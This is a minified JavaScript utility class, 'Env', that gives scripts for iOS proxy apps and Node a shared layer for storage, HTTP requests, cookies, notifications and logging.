function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
